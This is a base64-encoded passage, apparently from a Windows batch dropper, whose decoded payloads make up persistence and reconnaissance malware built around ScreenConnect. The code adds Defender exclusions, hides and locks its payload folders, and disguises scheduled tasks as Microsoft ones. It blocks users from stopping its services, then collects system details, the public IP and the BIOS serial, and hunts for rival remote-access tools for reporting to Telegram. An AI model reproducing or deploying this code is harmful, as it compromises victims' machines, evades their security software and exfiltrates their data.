bGwuZXhlJywnY2VydHV0aWwuZXhlJywnU2NyZWVuQ29ubmVjdC5DbGllbnRTZXJ2aWNlLmV4ZScs
J1NjcmVlbkNvbm5lY3QuV2luZG93c0NsaWVudC5leGUnKSl7IEFkZC1NcFByZWZlcmVuY2UgLUV4
Y2x1c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJF
TSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAt
LS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0t
LSBoaWRlIHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVX
RCUiID5udWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRv
IE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92
ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZs
ZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4N
CmZvciAlJUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikg
ZG8gKA0KICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVs
ZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNl
cnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50
byBnYXJiYWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkg
aW5zdGVhZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9
J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICcl
V0QlXGlkZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2gg
J15UQVNLX1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0
YXJ0KCdcJykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnTWljcm9zb2Z0XFdpbmRvd3Nc
RGlhZ25vc2lzXFNjaGVkdWxlZCcsJ01pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdNaWNy
b3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdNaWNyb3NvZnRcV2luZG93c1xUY3Bp
cFxJcEFkZHJlc3NDb25mbGljdDEnKSB9OyIgXg0KICAiZm9yZWFjaCgkbiBpbiAkbmFtZXMpeyAk
ZiA9IEpvaW4tUGF0aCAnJVRBU0tST09UJScgJG47IGlmKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGgg
JGYpeyAmIGljYWNscy5leGUgJGYgL2luaGVyaXRhbmNlOnIgfCBPdXQtTnVsbDsgJiBpY2FjbHMu
ZXhlICRmIC9ncmFudDpyICdOVCBBVVRIT1JJVFlcU1lTVEVNOkYnICdCVUlMVElOXEFkbWluaXN0
cmF0b3JzOkYnIHwgT3V0LU51bGw7ICYgYXR0cmliLmV4ZSAraCArcyAkZiB8IE91dC1OdWxsIH0g
fSIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBXTUkgd2F0Y2hkb2cgc3Vic2NyaXB0aW9uIGZp
bGVzIChjaGFpbiAyKSAtLS0NCmljYWNscyAiJVN5c3RlbVJvb3QlXFN5c3RlbTMyXHdiZW1cUmVw
b3NpdG9yeSIgL2dyYW50ICJOVCBBVVRIT1JJVFlcU1lTVEVNOkYiID5udWwgMj4mMQ0KDQpSRU0g
LS0tIEFDTDoga2VlcCBTY3JlZW5Db25uZWN0IGluc3RhbGwgZGlycyAob25jZTsgdGFrZW93biBl
dmVyeSB0aWNrIGlzIG5vaXN5KSAtLS0NCmlmIG5vdCBleGlzdCAiJVdEJVxzZWN1cmVfc2MuZmxh
ZyIgKA0KICBmb3IgJSVEIGluICgNCiAgICAiJVBGJVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVAxJSkiDQogICAgIiVQRiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICAgICIl
UEY4NiVcU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQMSUpIg0KICAgICIlUEY4NiVcU2NyZWVu
Q29ubmVjdCBDbGllbnQgKCVLRUVQMiUpIg0KICApIGRvICgNCiAgICBpZiBleGlzdCAiJSV+RCIg
Y2FsbCA6TG9ja0RpciAiJSV+RCINCiAgKQ0KICBlY2hvIHNjX2xvY2tlZD4lV0QlXHNlY3VyZV9z
Yy5mbGFnDQopDQoNClJFTSAtLS0gU0Mgc2VydmljZXM6IFNZU1RFTSBjYW4gY29uZmlnL3N0b3Av
ZGVsZXRlOyBCQSBmdWxsOyB1c2VycyBibG9ja2VkIC0tLQ0KUkVNIFNZOiBDQyBEQyBMQyBTVyBS
UCBEVCBMTyBSQyAgKG5vIFNEIC0+IGNhbm5vdCBjaGFuZ2UgdGhpcyBTRCBpdHNlbGYpDQpzZXQg
IlNEPUQ6KEE7O0NDRENMQ1NXUlBXUERUTE9DUlJDOzs7U1kpKEE7O0NDRENMQ1NXUlBXUERUTE9D
UlNEUkNXRFdPOzs7QkEpIg0Kc2MuZXhlIHNkc2V0ICIlUFJJTSUiICIlU0QlIiA+bnVsIDI+JjEN
CnNjLmV4ZSBzZHNldCAiJUFMVCUiICIlU0QlIiA+bnVsIDI+JjENCnNjLmV4ZSBjb25maWcgIiVQ
UklNJSIgc3RhcnQ9IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgY29uZmlnICIlQUxUJSIgc3RhcnQ9
IGF1dG8gPm51bCAyPiYxDQpzYy5leGUgZmFpbHVyZSAiJVBSSU0lIiByZXNldD0gODY0MDAgYWN0
aW9ucz0gcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAwMDAgPm51bCAyPiYx
DQpzYy5leGUgZmFpbHVyZSAiJUFMVCUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzYw
MDAwL3Jlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCg0KZWNobyBzZWN1cmVf
ZG9uZT4+IiVMT0clIg0KZXhpdCAvYiAwDQoNCjpMb2NrRGlyDQpzZXQgIlQ9JX4xIg0KaWYgbm90
IGV4aXN0ICIlVCUiIGV4aXQgL2IgMA0KUkVNIHRha2Ugb3duZXJzaGlwIHRoZW4gc3RyaXAgaW5o
ZXJpdGVkIEFDRXM7IFNZU1RFTStBZG1pbnMgb25seQ0KdGFrZW93biAvRiAiJVQlIiAvUiAvRCBZ
ID5udWwgMj4mMQ0KaWNhY2xzICIlVCUiIC9pbmhlcml0YW5jZTpyID5udWwgMj4mMQ0KaWNhY2xz
ICIlVCUiIC9ncmFudDpyICJOVCBBVVRIT1JJVFlcU1lTVEVNOihPSSkoQ0kpRiIgIkJVSUxUSU5c
QWRtaW5pc3RyYXRvcnM6KE9JKShDSSlGIiA+bnVsIDI+JjENCmljYWNscyAiJVQlIiAvcmVtb3Zl
OmcgIlVzZXJzIiAiQXV0aGVudGljYXRlZCBVc2VycyIgIkV2ZXJ5b25lIiAiTlQgQVVUSE9SSVRZ
XElOVEVSQUNUSVZFIiAiQlVJTFRJTlxVc2VycyIgPm51bCAyPiYxDQpleGl0IC9iIDANCg==
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4MDJUMTIgLSB0
YXNrIFRSIG93bmVyc2hpcCAobm8gV2luZG93cyBmYWxzZS1PSyk7IFJNTStEYXR0byBrZWVwOyBk
aWdlc3Q7IHBheWxvYWQgYnVpbGRzDQpwYXJhbSgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9
ICR0cnVlKV1bc3RyaW5nXSRTdGF0ZSwNCiAgICBbc3RyaW5nXSRTdW1tYXJ5ID0gJycsDQogICAg
W3N0cmluZ10kV29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJc
VGVtcFwud3VjYWNoZScsDQogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywNCiAgICBbVmFsaWRh
dGVTZXQoJ3JpY2gnLCAnY29tcGFjdCcpXVtzdHJpbmddJE1vZGUgPSAncmljaCcsDQogICAgW3N0
cmluZ10kQnVpbGQgPSAnTzE1JywNCiAgICBbc3RyaW5nXSRDb3VudCA9ICcwJw0KKQ0KDQokRXJy
b3JBY3Rpb25QcmVmZXJlbmNlID0gJ1NpbGVudGx5Q29udGludWUnDQokUHJvZ3Jlc3NQcmVmZXJl
bmNlID0gJ1NpbGVudGx5Q29udGludWUnDQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJd
OjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyIH0g
Y2F0Y2gge30NCg0KZnVuY3Rpb24gR2V0LUNmZyB7DQogICAgJHBhdGggPSBKb2luLVBhdGggJFdv
cmtEaXIgJ25vdGlmeS5jZmcnDQogICAgJGNmZyA9IEB7fQ0KICAgIGlmICgtbm90IChUZXN0LVBh
dGggJHBhdGgpKSB7IHJldHVybiAkY2ZnIH0NCiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGgg
JHBhdGggfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0Et
WmEtejAtOV9dKylccyo9XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkY2ZnWyRtYXRjaGVz
WzFdXSA9ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAk
Y2ZnDQp9DQoNCmZ1bmN0aW9uIEVzYyhbc3RyaW5nXSRzKSB7DQogICAgaWYgKCRudWxsIC1lcSAk
cykgeyByZXR1cm4gJycgfQ0KICAgIHJldHVybiAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1y
ZXBsYWNlICc8JywgJyZsdDsnIC1yZXBsYWNlICc+JywgJyZndDsnKQ0KfQ0KDQpmdW5jdGlvbiBH
ZXQtUHVibGljSXAgew0KICAgIGZvcmVhY2ggKCR1IGluIEAoDQogICAgICAgICAgICAnaHR0cHM6
Ly9hcGkuaXBpZnkub3JnJywNCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmlnLm1lL2lwJywN
CiAgICAgICAgICAgICdodHRwczovL2ljYW5oYXppcC5jb20nDQogICAgICAgICkpIHsNCiAgICAg
ICAgdHJ5IHsNCiAgICAgICAgICAgICRyID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdSAtVXNl
QmFzaWNQYXJzaW5nIC1UaW1lb3V0U2VjIDYNCiAgICAgICAgICAgICRpcCA9ICgkci5Db250ZW50
IHwgT3V0LVN0cmluZykuVHJpbSgpDQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEs
M30oXC5cZHsxLDN9KXszfSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlwIH0NCiAg
ICAgICAgfSBjYXRjaCB7fQ0KICAgIH0NCiAgICByZXR1cm4gJ24vYScNCn0NCg0KZnVuY3Rpb24g
R2V0LUxvY2FsSXBzIHsNCiAgICB0cnkgew0KICAgICAgICAkaXBzID0gR2V0LU5ldElQQWRkcmVz
cyAtQWRkcmVzc0ZhbWlseSBJUHY0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAg
ICAgICAgICAgIFdoZXJlLU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1h
bmQgJF8uUHJlZml4T3JpZ2luIC1uZSAnV2VsbEtub3duJyB9IHwNCiAgICAgICAgICAgIFNlbGVj
dC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IElQQWRkcmVzcyAtVW5pcXVlDQogICAgICAgIGlmICgk
aXBzKSB7IHJldHVybiAoJGlwcyAtam9pbiAnLCAnKSB9DQogICAgfSBjYXRjaCB7fQ0KICAgIHRy
eSB7DQogICAgICAgICRpcHMgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfTmV0d29ya0FkYXB0ZXJD
b25maWd1cmF0aW9uIC1GaWx0ZXIgJ0lQRW5hYmxlZD1UcnVlJyB8DQogICAgICAgICAgICBGb3JF
YWNoLU9iamVjdCB7ICRfLklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAt
bm90bGlrZSAnMTI3LionIC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQ0KICAgICAgICBpZiAoJGlw
cykgeyByZXR1cm4gKCgkaXBzIHwgU2VsZWN0LU9iamVjdCAtVW5pcXVlKSAtam9pbiAnLCAnKSB9
DQogICAgfSBjYXRjaCB7fQ0KICAgIHJldHVybiAnbi9hJw0KfQ0KDQpmdW5jdGlvbiBHZXQtT3NJ
bmZvIHsNCiAgICAkbyA9IFtvcmRlcmVkXUB7DQogICAgICAgIENhcHRpb24gPSAnbi9hJzsgVmVy
c2lvbiA9ICduL2EnOyBCdWlsZCA9ICduL2EnOyBBcmNoID0gJ24vYScNCiAgICAgICAgRG9tYWlu
ID0gJ24vYSc7IEluc3RhbGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScNCiAgICAgICAg
Q1BVID0gJ24vYSc7IE1hbnVmYWN0dXJlciA9ICduL2EnOyBNb2RlbCA9ICduL2EnOyBTZXJpYWwg
PSAnbi9hJw0KICAgICAgICBUb3RhbFJBTV9HQiA9ICduL2EnOyBEaXNrRnJlZV9HQiA9ICduL2En
OyBEaXNrU2l6ZV9HQiA9ICduL2EnDQogICAgfQ0KICAgIHRyeSB7DQogICAgICAgICRvcyA9IEdl
dC1DaW1JbnN0YW5jZSBXaW4zMl9PcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgJG8uQ2FwdGlvbiA9
ICRvcy5DYXB0aW9uDQogICAgICAgICRvLlZlcnNpb24gPSAkb3MuVmVyc2lvbg0KICAgICAgICAk
by5CdWlsZCA9ICRvcy5CdWlsZE51bWJlcg0KICAgICAgICAkby5BcmNoID0gJG9zLk9TQXJjaGl0
ZWN0dXJlDQogICAgICAgICRvLkluc3RhbGxEYXRlID0gKCRvcy5JbnN0YWxsRGF0ZSB8IEdldC1E
YXRlIC1Gb3JtYXQgJ3l5eXktTU0tZGQnKQ0KICAgICAgICAkby5MYXN0Qm9vdCA9ICgkb3MuTGFz
dEJvb3RVcFRpbWUgfCBHZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tJykNCiAgICAg
ICAgJG8uVG90YWxSQU1fR0IgPSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlT
aXplIC8gMU1CLCAxKQ0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkY3MgPSBH
ZXQtQ2ltSW5zdGFuY2UgV2luMzJfQ29tcHV0ZXJTeXN0ZW0NCiAgICAgICAgJG8uRG9tYWluID0g
aWYgKCRjcy5QYXJ0T2ZEb21haW4pIHsgJGNzLkRvbWFpbiB9IGVsc2UgeyAkY3MuV29ya2dyb3Vw
IH0NCiAgICAgICAgJG8uTWFudWZhY3R1cmVyID0gJGNzLk1hbnVmYWN0dXJlcg0KICAgICAgICAk
by5Nb2RlbCA9ICRjcy5Nb2RlbA0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAk
by5DUFUgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1PYmplY3Qg
LUZpcnN0IDEgLUV4cGFuZFByb3BlcnR5IE5hbWUpDQogICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7
DQogICAgICAgICRvLlNlcmlhbCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQklPUykuU2VyaWFs
TnVtYmVyDQogICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRkID0gR2V0LUNpbUlu
c3RhbmNlIFdpbjMyX0xvZ2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciDQogICAgICAg
ICRvLkRpc2tGcmVlX0dCID0gW21hdGhdOjpSb3VuZCgkZC5GcmVlU3BhY2UgLyAxR0IsIDEpDQog
ICAgICAgICRvLkRpc2tTaXplX0dCID0gW21hdGhdOjpSb3VuZCgkZC5TaXplIC8gMUdCLCAxKQ0K
ICAgIH0gY2F0Y2gge30NCiAgICByZXR1cm4gJG8NCn0NCg0KZnVuY3Rpb24gR2V0LVN2Y0xpbmUo
W3N0cmluZ10kbmFtZSkgew0KICAgICRzID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJ
TlNUQUxMRUQnIH0NCiAgICByZXR1cm4gKCd7MH0gKFN0YXJ0PXsxfSknIC1mICRzLlN0YXR1cywg
JHMuU3RhcnRUeXBlKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtVGFza0hlYWx0aChbc3RyaW5nXSR0bikg
ew0KICAgICRvdXQgPSAmIHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1ROICR0biAvRk8gTElTVCAvViAy
PiRudWxsDQogICAgaWYgKCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91dCkgew0KICAg
ICAgICByZXR1cm4gQHsgUHJlc2VudCA9ICRmYWxzZTsgU3RhdHVzID0gJ01JU1NJTkcnOyBOZXh0
ID0gJyc7IExhc3QgPSAnJzsgUmVzdWx0ID0gJyc7IE91cnMgPSAkZmFsc2UgfQ0KICAgIH0NCiAg
ICAkbWFwID0gQHt9DQogICAgJGJsb2IgPSAoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsgIiRfIiB9
KSAtam9pbiAiYG4iDQogICAgZm9yZWFjaCAoJGxpbmUgaW4gJG91dCkgew0KICAgICAgICBpZiAo
JGxpbmUgLW1hdGNoICdeXHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsNCiAgICAgICAgICAgICRt
YXBbJG1hdGNoZXNbMV0uVHJpbSgpXSA9ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQog
ICAgfQ0KICAgICRzdGF0dXMgPSAkbWFwWydTdGF0dXMnXQ0KICAgIGlmICgtbm90ICRzdGF0dXMp
IHsgJHN0YXR1cyA9ICRtYXBbJ1Rhc2sgU3RhdHVzJ10gfQ0KICAgIGlmICgtbm90ICRzdGF0dXMp
IHsgJHN0YXR1cyA9ICdwcmVzZW50JyB9DQogICAgJG5leHQgPSAkbWFwWydOZXh0IFJ1biBUaW1l
J10NCiAgICBpZiAoLW5vdCAkbmV4dCkgeyAkbmV4dCA9ICcnIH0NCiAgICAkbGFzdCA9ICRtYXBb
J0xhc3QgUnVuIFRpbWUnXQ0KICAgIGlmICgtbm90ICRsYXN0KSB7ICRsYXN0ID0gJycgfQ0KICAg
ICRyZXN1bHQgPSAkbWFwWydMYXN0IFJlc3VsdCddDQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAk
cmVzdWx0ID0gJycgfQ0KICAgICR0ciA9ICRtYXBbJ1Rhc2sgVG8gUnVuJ10NCiAgICBpZiAoLW5v
dCAkdHIpIHsgJHRyID0gJG1hcFsnVGFzayB0byBSdW4nXSB9DQogICAgJG91cnMgPSAoJGJsb2Ig
LW1hdGNoICcoP2kpb3duX21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNh
Y2hlXFwnKQ0KICAgICMgUHJlc2VudCBXaW5kb3dzIGJ1aWx0LWluIHdpdGggc2FtZSBuYW1lIGlz
IE5PVCBoZWFsdGh5IGZvciB1cw0KICAgICRoZWFsdGh5ID0gJG91cnMgLWFuZCAoKCRzdGF0dXMg
LW1hdGNoICdSZWFkeXxSdW5uaW5nJykgLW9yICgkc3RhdHVzIC1lcSAncHJlc2VudCcpKQ0KICAg
IHJldHVybiBAew0KICAgICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgT3VycyAgICA9IFti
b29sXSRvdXJzDQogICAgICAgIEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRoeQ0KICAgICAgICBTdGF0
dXMgID0gJChpZiAoJG91cnMpIHsgJHN0YXR1cyB9IGVsc2UgeyAnTk9UX09VUlMnIH0pDQogICAg
ICAgIE5leHQgICAgPSAkbmV4dA0KICAgICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVz
dWx0ICA9ICRyZXN1bHQNCiAgICAgICAgVHIgICAgICA9ICQoaWYgKCR0cikgeyAkdHIgfSBlbHNl
IHsgJycgfSkNCiAgICB9DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAjIERldGVj
dCByaXZhbHMgZm9yIFRlbGVncmFtLiBLRUVQOiBTY3JlZW5Db25uZWN0IGFsbG93bGlzdCArIERh
dHRvL0NlbnRyYVN0YWdlLg0KICAgICR0b2tlbnMgPSBAKA0KICAgICAgICAnQW55RGVzaycsICdU
ZWFtVmlld2VyJywgJ3R2bnNlcnZlcicsICdEV0FnZW50JywgJ0RXU2VydmljZScsICdMb2dNZUlu
JywgJ0xNSUd1YXJkaWFuJywNCiAgICAgICAgJ1dpblZOQycsICd2bmNzZXJ2ZXInLCAndHZfJywg
J1NwbGFzaHRvcCcsICdab2hvIEFzc2lzdCcsICdSdXN0RGVzaycsICdSZW1vdGVQQycsICdEYW1l
V2FyZScsDQogICAgICAgICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1NJywgJ05pbmph
T25lJywgJ05pbmphUk1NQWdlbnQnLCAnS2FzZXlhJywgJ0FnZW50TW9uJywgJ1B1bHNld2F5Jywg
J1BDIE1vbml0b3InLCAnU3luY3JvJywgJ0thYnV0bycsDQogICAgICAgICdTdXBlck9wcycsICdN
YW5hZ2VFbmdpbmUnLCAnVUVNUycsICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJh
bCcsICdTb2xhcldpbmRzIE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNlcnZpY2Un
LCAnTGFiVGVjaCcsDQogICAgICAgICdBY3Rpb24xJywgJ1NpbXBsZUhlbHAnLCAnQm9tZ2FyJywg
J0JleW9uZFRydXN0JywgJ01lc2hBZ2VudCcsICdNZXNoIENlbnRyYWwnLCAnTWVzaCBBZ2VudCcs
DQogICAgICAgICdUYWN0aWNhbFJNTScsICd0YWN0aWNhbHJtbScsICdHZXRTY3JlZW4nLCAnU3Vw
cmVtbycsICdydXRzZXJ2JywgJ3JlbW90aW5nX2hvc3QnLA0KICAgICAgICAnQ2hyb21lIFJlbW90
ZSBEZXNrdG9wJywgJ1BhcnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVsIEFn
ZW50JywNCiAgICAgICAgJ0NvbnRpbnV1bScsICdTQUFaJywgJ05hdmVyaXNrJywgJ0ltbXlCb3Qn
LCAnQXV0b21veCcsICdhbWFnZW50JywgJ0Fjcm9uaXMgQ3liZXInLCAnRG9tb3R6JywgJ0F1dmlr
JywNCiAgICAgICAgJ0JhcnJhY3VkYSBSTU0nLCAnTWFuYWdlZCBXb3JrcGxhY2UnLCAnR292ZXJs
YW4nLCAnUERRIERlcGxveScsICdQRFEgSW52ZW50b3J5JywgJ1BEUSBDb25uZWN0JywNCiAgICAg
ICAgJ04tYWJsZScsICdOLWNlbnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2
YW5jZWQgTW9uaXRvcmluZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLA0KICAg
ICAgICAnTGl0ZU1hbmFnZXInLCAnUmFkbWluJywgJ05vTWFjaGluZScsICdJcGVyaXVzJywgJ0lT
TCBMaWdodCcsICdBbW15eScsICdUaWdodFZOQycsICdVbHRyYVZOQycsICdSZWFsVk5DJw0KICAg
ICkNCiAgICAka2VlcFRva2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZp
Y2UnLCAnQXV0b3Rhc2tFbmRwb2ludCcpDQogICAgJGhpdHMgPSBOZXctT2JqZWN0IFN5c3RlbS5D
b2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3RyaW5nXQ0KICAgICRzZWVuID0gQHt9DQoNCiAgICBm
dW5jdGlvbiBBZGQtSGl0KFtzdHJpbmddJGtpbmQsIFtzdHJpbmddJG5hbWUpIHsNCiAgICAgICAg
JGtleSA9ICIka2luZHwkbmFtZSIuVG9Mb3dlckludmFyaWFudCgpDQogICAgICAgIGlmICgkc2Vl
bi5Db250YWluc0tleSgka2V5KSkgeyByZXR1cm4gfQ0KICAgICAgICAkc2Vlblska2V5XSA9ICR0
cnVlDQogICAgICAgIFt2b2lkXSRoaXRzLkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPicg
LWYgJGtpbmQsIChFc2MgJG5hbWUpKSkNCiAgICB9DQogICAgZnVuY3Rpb24gVGVzdC1LZWVwTmFt
ZShbc3RyaW5nXSRzKSB7DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQ0K
ICAgICAgICBpZiAoJHMgLWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVlIH0N
CiAgICAgICAgZm9yZWFjaCAoJGsgaW4gJGtlZXBUb2tlbnMpIHsgaWYgKCRzIC1saWtlICIqJGsq
IikgeyByZXR1cm4gJHRydWUgfSB9DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQoNCiAg
ICBHZXQtU2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2Jq
ZWN0IHsNCiAgICAgICAgJG4gPSAkXy5OYW1lDQogICAgICAgICRkID0gJF8uRGlzcGxheU5hbWUN
CiAgICAgICAgaWYgKFRlc3QtS2VlcE5hbWUgJG4gLW9yIFRlc3QtS2VlcE5hbWUgJGQpIHsNCiAg
ICAgICAgICAgIGlmICgkbiAtbGlrZSAnKkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0
dG8qJyAtb3IgJG4gLWxpa2UgJypDYWdTZXJ2aWNlKicpIHsNCiAgICAgICAgICAgICAgICBBZGQt
SGl0ICdrZWVwLWRhdHRvJyAoIiRuICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAgIH0NCiAg
ICAgICAgICAgIHJldHVybg0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tl
bnMpIHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQq
Iikgew0KICAgICAgICAgICAgICAgIEFkZC1IaXQgJ3N2YycgKCIkbiAoJCgkXy5TdGF0dXMpKSIp
DQogICAgICAgICAgICAgICAgYnJlYWsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0N
Cg0KICAgIEdldC1Qcm9jZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFj
aC1PYmplY3Qgew0KICAgICAgICAkbiA9ICRfLlByb2Nlc3NOYW1lDQogICAgICAgIGlmIChUZXN0
LUtlZXBOYW1lICRuKSB7IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMp
IHsNCiAgICAgICAgICAgIGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAgICAgICAgICAgICBB
ZGQtSGl0ICdwcm9jJyAkbg0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQog
